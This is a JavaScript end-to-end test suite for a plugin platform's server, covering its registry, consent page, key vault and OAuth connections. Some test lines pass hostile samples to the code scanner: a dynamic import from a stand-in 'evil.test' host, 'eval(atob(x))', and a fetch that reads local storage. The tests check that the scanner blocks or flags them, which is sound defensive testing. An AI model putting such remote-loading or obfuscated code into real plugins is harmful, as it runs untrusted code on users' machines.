// The plugin platform's server side, end to end against a real PostgreSQL: the registry (goal 6), the trusted page
// and consent (goal 3), the vault and connections (goal 8).
import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import http from 'node:http'
import crypto from 'node:crypto'
import pg from 'pg'
import { loadConfig } from '../server/config.mjs'
import { connect, runMigrations } from '../server/db/index.mjs'
import { createApp } from '../server/app.mjs'
import { checkCode } from '../server/registry.mjs'
import { isPrivateAddress } from '../server/vault.mjs'

const ADMIN_URL = process.env.TEST_DATABASE_URL || process.env.DATABASE_URL
if (!ADMIN_URL) throw new Error('set TEST_DATABASE_URL')
const DB_NAME = `lc_plug_${process.pid}_${Date.now()}`
const dbUrl = (() => { const u = new URL(ADMIN_URL); u.pathname = `/${DB_NAME}`; return u.toString() })()
const quiet = () => {}
let conn, app, server, base, echo, echoBase
const seen = [] // requests the fake "other site" received

before(async () => {
  const admin = new pg.Client({ connectionString: ADMIN_URL })
  await admin.connect(); await admin.query(`create database "${DB_NAME}"`); await admin.end()
  conn = connect(dbUrl)
  await runMigrations(conn.pool, { log: quiet })
  // a fake third-party API for connections
  echo = http.createServer((req, res) => { seen.push({ url: req.url, auth: req.headers.authorization }); res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ ok: true, echoedKey: req.headers.authorization })) })
  await new Promise((r) => echo.listen(0, '127.0.0.1', r))
  echoBase = `http://127.0.0.1:${echo.address().port}`
  const cfg = loadConfig({ DATABASE_URL: dbUrl, PUSH_DRY_RUN: '1', APP_URL: 'http://lc.test', ADMIN_EMAILS: 'admin@x.test', DIST: '/nonexistent', VAULT_KEY: crypto.randomBytes(32).toString('base64'), CONNECTIONS_ALLOW_PRIVATE: '1' })
  app = await createApp({ cfg, db: conn.db, pool: conn.pool, log: quiet })
  server = http.createServer(app.handler)
  await new Promise((r) => server.listen(0, '127.0.0.1', r))
  base = `http://127.0.0.1:${server.address().port}`
})
after(async () => {
  app?.close(); server?.close(); echo?.close()
  await conn?.pool.end()
  const admin = new pg.Client({ connectionString: ADMIN_URL })
  await admin.connect(); await admin.query(`drop database if exists "${DB_NAME}" with (force)`); await admin.end()
})

// http.request, not fetch: fetch (undici) overwrites the Sec-Fetch-* headers a browser would send
function raw(method, p, body, headers) {
  return new Promise((resolve, reject) => {
    const req = http.request(base + p, { method, headers: { ...headers, ...(body !== undefined ? { 'Content-Length': Buffer.byteLength(body) } : {}) } }, (res) => {
      const chunks = []
      res.on('data', (c) => chunks.push(c))
      res.on('end', () => resolve({ status: res.statusCode, headers: { get: (k) => { const v = res.headers[k.toLowerCase()]; return Array.isArray(v) ? v.join(', ') : v ?? null } }, text: Buffer.concat(chunks).toString('utf8') }))
    })
    req.on('error', reject)
    if (body !== undefined) req.write(body)
    req.end()
  })
}
function client() {
  let cookie = ''
  const c = async (method, p, body, headers = {}) => {
    const form = typeof body === 'string'
    const res = await raw(method, p, body === undefined ? undefined : form ? body : JSON.stringify(body), { ...(body !== undefined ? { 'Content-Type': form ? 'application/x-www-form-urlencoded' : 'application/json' } : {}), ...(cookie ? { Cookie: cookie } : {}), ...headers })
    const set = res.headers.get('set-cookie')
    if (set) cookie = set.split(';')[0].endsWith('=') ? '' : set.split(';')[0]
    let json = null
    try { json = JSON.parse(res.text) } catch { /* html or js */ }
    return { status: res.status, body: json, text: res.text, headers: res.headers }
  }
  return c
}
const NAV = { 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1' }
const nonceOf = (html) => /name="nonce" value="([^"]+)"/.exec(html)?.[1]
/** Open the trusted page for an action and confirm it, the way a person would (form fields as extra). */
async function confirm(c, query, fields = {}) {
  const page = await c('GET', `/trust?${query}`, undefined, NAV)
  assert.equal(page.status, 200, page.text.slice(0, 300))
  const nonce = nonceOf(page.text)
  assert.ok(nonce, `no nonce on ${query}: ${page.text.slice(0, 400)}`)
  const kind = new URLSearchParams(query).get('do')
  return c('POST', '/trust', new URLSearchParams({ nonce, do: kind, decision: 'yes', ...fields }).toString(), NAV)
}

const CODE = `export default {
  sdk: 1, title: 'Habits', icon: 'repeat',
  types: [{ type: 'habits.Habit', kindOf: 'common.Habit', traits: ['titled', 'recurring'] }],
  pages: [{ title: 'Habits', mount(el, lc) { el.textContent = lc.data.list('habits.Habit').length + ' habits' } }],
}
`
let alice, bob, admin, published
test('setup: three accounts', async () => {
  admin = client(); alice = client(); bob = client()
  assert.equal((await admin('POST', '/api/auth/signup', { email: 'admin@x.test', password: 'pw-admin-123' })).status, 201)
  assert.equal((await alice('POST', '/api/auth/signup', { email: 'alice@x.test', password: 'pw-alice-123' })).status, 201)
  assert.equal((await bob('POST', '/api/auth/signup', { email: 'bob@x.test', password: 'pw-bob-1234' })).status, 201)
})

test('automated checks: remote code is blocked; obfuscation, data-door bypass and undeclared sites are flagged', () => {
  assert.equal(checkCode("const m = await import('https://evil.test/x.js')").blocked[0].id, 'remote-code')
  assert.equal(checkCode('eval(atob(x))').blocked[0].id, 'remote-code')
  const w = checkCode("fetch('https://api.example.com/x'); localStorage.getItem('life-console/v1')", { internet: [] }).warnings.map((x) => x.id)
  assert.ok(w.includes('undeclared-sites') && w.includes('data-door'))
  assert.deepEqual(checkCode("fetch('https://www.strava.com/api')", { internet: ['www.strava.com'] }).warnings, [])
})

test('registry: a handle, then publish under it; versions are fixed; others see only public plugins', async () => {
  assert.equal((await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.0.0', code: CODE })).status, 400, 'needs a handle first')
  assert.equal((await alice('POST', '/api/registry/handle', { handle: 'life-console' })).status, 400, 'reserved')
  assert.equal((await alice('POST', '/api/registry/handle', { handle: 'alice' })).body.handle, 'alice')
  assert.equal((await bob('POST', '/api/registry/handle', { handle: 'alice' })).status, 409, 'taken')
  await bob('POST', '/api/registry/handle', { handle: 'bob' })
  assert.equal((await alice('POST', '/api/registry/publish', { name: 'bob/habits', version: '1.0.0', code: CODE })).status, 403, 'only under your own handle')
  assert.equal((await alice('POST', '/api/registry/publish', { name: 'alice/evil', version: '1.0.0', code: "export default {}; import('https://x.test/a.js')" })).status, 422)
  const r = await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.0.0', code: CODE, manifest: { title: 'Habits', says: { internet: [] } }, visibility: 'private' })
  assert.equal(r.status, 201)
  assert.equal(r.body.hash, crypto.createHash('sha256').update(CODE).digest('hex'))
  published = r.body
  assert.equal((await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.0.0', code: CODE + '//x' })).status, 409, 'a version is fixed')
  assert.equal((await bob('GET', '/api/registry/plugins')).body.plugins.length, 0, 'private: bob does not see it')
  assert.equal((await bob('GET', `/api/registry/code/${published.hash}.js`)).status, 404)
  assert.match((await alice('GET', `/api/registry/code/${published.hash}.js`)).text, /export default/, 'the owner can load it')
  assert.equal((await alice('GET', `/api/registry/code/${published.hash}.js`, undefined, { 'Service-Worker': 'script' })).status, 403, 'never registrable as a service worker')
  const pub = await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.1.0', code: CODE.replace('Habits', 'Habits 1.1'), manifest: { title: 'Habits' }, visibility: 'public', changelog: 'Streaks' })
  assert.equal(pub.status, 201)
  const list = (await bob('GET', '/api/registry/plugins')).body.plugins
  assert.equal(list.length, 1)
  assert.equal(list[0].latest.version, '1.1.0')
  assert.equal(list[0].worksWithEverything, true)
  assert.equal((await bob('GET', '/api/registry/plugins/alice/habits')).body.versions.length, 2)
  published = pub.body
})

test('consent: the trusted page refuses fetch(), frames and posts without its nonce', async () => {
  assert.equal((await bob('GET', '/trust?do=enable-plugins')).status, 403, 'no Fetch Metadata: refused')
  assert.equal((await bob('GET', '/trust?do=enable-plugins', undefined, { 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors' })).status, 403, 'a fetch() from a plugin')
  assert.equal((await bob('GET', '/trust?do=enable-plugins', undefined, { 'Sec-Fetch-Dest': 'iframe', 'Sec-Fetch-Mode': 'navigate' })).status, 403, 'a frame')
  const page = await bob('GET', '/trust?do=enable-plugins', undefined, NAV)
  assert.equal(page.status, 200)
  assert.match(page.headers.get('content-security-policy'), /default-src 'none'/)
  assert.ok(!/<script/i.test(page.text), 'no scripts on the trusted page')
  assert.equal(page.headers.get('cross-origin-opener-policy'), 'same-origin')
  const forged = await bob('POST', '/trust', new URLSearchParams({ nonce: 'guess', do: 'enable-plugins', decision: 'yes' }).toString(), NAV)
  assert.equal(forged.status, 400)
  const crossSite = await bob('POST', '/trust', new URLSearchParams({ nonce: nonceOf(page.text), do: 'enable-plugins', decision: 'yes' }).toString(), { ...NAV, 'Sec-Fetch-Site': 'cross-site' })
  assert.equal(crossSite.status, 403)
  // a nonce is bound to the action it was shown for
  const swapped = await bob('POST', '/trust', new URLSearchParams({ nonce: nonceOf(page.text), do: 'delete-account', decision: 'yes' }).toString(), NAV)
  assert.equal(swapped.status, 400)
  assert.equal((await bob('GET', '/api/auth/me')).status, 200, 'still has an account')
})

test('consent: enable Public plugins, install from the registry, load, update, toggle, remove', async () => {
  assert.equal((await bob('GET', '/api/plugins/installed')).body.publicPlugins, false)
  const early = await bob('GET', `/trust?do=install&pkg=alice/habits&hash=${published.hash}`, undefined, NAV)
  assert.match(early.text, /Turn on Public plugins first/)
  assert.equal((await confirm(bob, 'do=enable-plugins')).status, 200)
  const me = (await bob('GET', '/api/auth/me')).body.user
  assert.equal(me.publicPlugins, true)
  const done = await confirm(bob, `do=install&pkg=alice/habits&hash=${published.hash}`)
  assert.match(done.text, /Installed alice\/habits 1\.1\.0/)
  const inst = (await bob('GET', '/api/plugins/installed')).body.plugins
  assert.equal(inst.length, 1)
  assert.equal(inst[0].hash, published.hash)
  assert.equal(inst[0].enabled, true)
  assert.match((await bob('GET', `/api/registry/code/${published.hash}.js`)).text, /Habits 1.1/, 'the console can load it')
  // a newer version shows up as an update; installing it is another consent
  const v2 = await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.2.0', code: CODE.replace('Habits', 'Habits 1.2'), visibility: 'public', changelog: 'Reminders' })
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins[0].update.version, '1.2.0')
  await confirm(bob, `do=install&pkg=alice/habits&hash=${v2.body.hash}`)
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins[0].version, '1.2.0')
  await confirm(bob, 'do=toggle&pkg=alice/habits&on=0')
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins[0].enabled, false)
  await confirm(bob, 'do=toggle&pkg=alice/habits&on=1')
  // pulled by an admin: it stops loading everywhere
  assert.equal((await alice('POST', '/api/admin/registry/pull', { hash: v2.body.hash })).status, 403)
  assert.equal((await admin('POST', '/api/admin/registry/pull', { hash: v2.body.hash, reason: 'malware' })).status, 200)
  const after = (await bob('GET', '/api/plugins/installed')).body.plugins[0]
  assert.equal(after.enabled, false)
  assert.equal(after.pulled, true)
  assert.equal((await bob('GET', `/api/registry/code/${v2.body.hash}.js`)).status, 404)
  const rm = await confirm(bob, 'do=remove&pkg=alice/habits', { forget: '1' })
  assert.match(rm.text, /forget=alice%2Fhabits/, 'the console is told to delete its data')
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins.length, 0)
})

test('consent: once Public plugins are on, token, password and delete need the trusted page', async () => {
  const t = await bob('POST', '/api/auth/tokens', { name: 'Mac app' })
  assert.equal(t.status, 403)
  assert.equal(t.body.trust, '/trust?do=token')
  assert.equal((await bob('POST', '/api/auth/password', { current: 'pw-bob-1234', password: 'new-pass-999' })).status, 403)
  assert.equal((await bob('DELETE', '/api/auth/me', { password: 'pw-bob-1234' })).status, 403)
  const tok = await confirm(bob, 'do=token&name=Mac%20app')
  const token = /readonly value="([^"]+)"/.exec(tok.text)?.[1]
  assert.ok(token)
  assert.equal((await raw('GET', '/api/auth/me', undefined, { Authorization: `Bearer ${token}` })).status, 200)
  // alice never turned plugins on: her flows are unchanged
  assert.equal((await alice('POST', '/api/auth/tokens', { name: 'Mac app' })).status, 201)
})

test('vault: a key is saved only on the trusted page, never returned, sent only to its site', async () => {
  const host = new URL(echoBase).hostname
  await confirm(bob, `do=vault-save&name=echo&site=${host}`, { secret: 's3cret-key' })
  const list = (await bob('GET', '/api/connections')).body
  assert.equal(list.on, true)
  assert.deepEqual(list.connections.map((c) => [c.name, c.site]), [['echo', host]])
  assert.ok(!JSON.stringify(list).includes('s3cret'), 'never returned')
  const r = await bob('POST', '/api/connections/request', { name: 'echo', url: `${echoBase}/v1/me` })
  assert.equal(r.status, 200)
  assert.equal(seen.at(-1).auth, 'Bearer s3cret-key', 'the server added the key')
  assert.equal(r.body.json.echoedKey, 'Bearer [key]', 'an echoed key is masked in the answer')
  assert.equal((await bob('POST', '/api/connections/request', { name: 'echo', url: 'http://elsewhere.test/x' })).status, 403, 'only to its site')
  assert.equal((await alice('POST', '/api/connections/request', { name: 'echo', url: `${echoBase}/v1/me` })).status, 404, "another account can't use it")
  assert.ok(isPrivateAddress('10.0.0.5') && isPrivateAddress('127.0.0.1') && isPrivateAddress('::1') && !isPrivateAddress('8.8.8.8'))
})

test('consent: delete account on the trusted page', async () => {
  const r = await confirm(bob, 'do=delete-account', { password: 'pw-bob-1234' })
  assert.match(r.text, /Your account is deleted/)
  assert.equal((await bob('GET', '/api/auth/me')).status, 401)
})

test('OAuth connections: connect on the trusted page, tokens in the vault, refreshed by the broker (G7)', async () => {
  // a fake provider: /authorize is never visited by the server; /token issues and refreshes tokens
  let issued = 0
  const prov = http.createServer((req, res) => {
    let body = ''
    req.on('data', (c) => { body += c })
    req.on('end', () => {
      const f = new URLSearchParams(body)
      if (req.url === '/token') {
        issued++
        res.writeHead(200, { 'Content-Type': 'application/json' })
        return res.end(JSON.stringify(f.get('grant_type') === 'refresh_token'
          ? { access_token: `fresh-${issued}`, expires_in: 3600 }
          : { access_token: 'old-token', refresh_token: 'r1', expires_in: 1 })) // expires at once: the broker must refresh
      }
      seen.push({ url: req.url, auth: req.headers.authorization })
      res.writeHead(200, { 'Content-Type': 'application/json' }); res.end('{"ok":true}')
    })
  })
  await new Promise((r) => prov.listen(0, '127.0.0.1', r))
  const pb = `http://127.0.0.1:${prov.address().port}`
  const cfg = loadConfig({ DATABASE_URL: dbUrl, PUSH_DRY_RUN: '1', APP_URL: 'http://lc.test', ADMIN_EMAILS: '', DIST: '/nonexistent', VAULT_KEY: crypto.randomBytes(32).toString('base64'), CONNECTIONS_ALLOW_PRIVATE: '1',
    OAUTH_FAKEFIT_CLIENT_ID: 'cid', OAUTH_FAKEFIT_CLIENT_SECRET: 'csecret', OAUTH_FAKEFIT_AUTH_URL: `${pb}/authorize`, OAUTH_FAKEFIT_TOKEN_URL: `${pb}/token`, OAUTH_FAKEFIT_SITE: '127.0.0.1', OAUTH_FAKEFIT_TITLE: 'FakeFit' })
  assert.deepEqual(Object.keys(cfg.oauthProviders), ['fakefit'], 'only providers with a client id and secret are on')
  const app2 = await createApp({ cfg, db: conn.db, pool: conn.pool, log: quiet })
  const s2 = http.createServer(app2.handler)
  await new Promise((r) => s2.listen(0, '127.0.0.1', r))
  const saveBase = base
  base = `http://127.0.0.1:${s2.address().port}`
  try {
    const carol = client()
    await carol('POST', '/api/auth/signup', { email: 'carol@x.test', password: 'pw-carol-123' })
    assert.deepEqual((await carol('GET', '/api/connections')).body.providers.map((p) => p.name), ['fakefit'])
    const go = await confirm(carol, 'do=connect&provider=fakefit')
    assert.equal(go.status, 303)
    const to = new URL(go.headers.get('location'))
    assert.equal(to.origin + to.pathname, `${pb}/authorize`)
    assert.equal(to.searchParams.get('redirect_uri'), 'http://lc.test/trust/oauth')
    const state = to.searchParams.get('state')
    // the provider sends the person back (a cross-site top-level navigation)
    const back = await carol('GET', `/trust/oauth?code=abc&state=${encodeURIComponent(state)}`, undefined, { ...NAV, 'Sec-Fetch-Site': 'cross-site' })
    assert.match(back.text, /Connected/)
    assert.equal((await carol('GET', `/trust/oauth?code=abc&state=${encodeURIComponent(state)}`, undefined, NAV)).status, 400, 'a state works once')
    const conns = (await carol('GET', '/api/connections')).body.connections
    assert.deepEqual(conns.map((c) => [c.name, c.site, c.scheme]), [['fakefit', '127.0.0.1', 'oauth:fakefit']])
    const r = await carol('POST', '/api/connections/request', { name: 'fakefit', url: `${pb}/v1/athlete` })
    assert.equal(r.status, 200)
    assert.equal(seen.at(-1).auth, 'Bearer fresh-2', 'the expired token was refreshed first')
  } finally { base = saveBase; app2.close(); s2.close(); prov.close() }
})
